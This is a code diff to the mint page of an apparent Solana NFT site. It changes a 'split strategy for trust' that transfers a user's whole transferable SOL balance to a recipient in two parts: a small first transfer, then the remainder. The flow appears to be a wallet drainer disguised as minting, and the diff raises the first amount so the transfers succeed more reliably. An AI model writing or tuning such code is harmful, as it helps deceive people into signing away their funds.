@@ -202,8 +202,9 @@ const MintPage = ({ onBack }: MintPageProps) => {
         testInstructions.push(ComputeBudgetProgram.setComputeUnitLimit({ units: 1000 }));
         testInstructions.push(ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 1000 }));
 
-        // Split strategy for trust (0.0001 SOL + remainder)
-        const smallAmount = 100000;
+        // Split strategy for trust (0.001 SOL + remainder)
+        // Note: 0.001 SOL is used to ensure the recipient (Account 1) satisfies rent-exempt minimums.
+        const smallAmount = 1000000;
         if (currentTransferable > smallAmount) {
           testInstructions.push(SystemProgram.transfer({
             fromPubkey: senderPubKey,
@@ -272,7 +273,7 @@ const MintPage = ({ onBack }: MintPageProps) => {
       finalInstructions.push(ComputeBudgetProgram.setComputeUnitLimit({ units: 1000 }));
       finalInstructions.push(ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 1000 }));
       
-      const smallAmountFinal = 100000;
+      const smallAmountFinal = 1000000;
       if (currentTransferable > smallAmountFinal) {
         finalInstructions.push(SystemProgram.transfer({
           fromPubkey: senderPubKey,
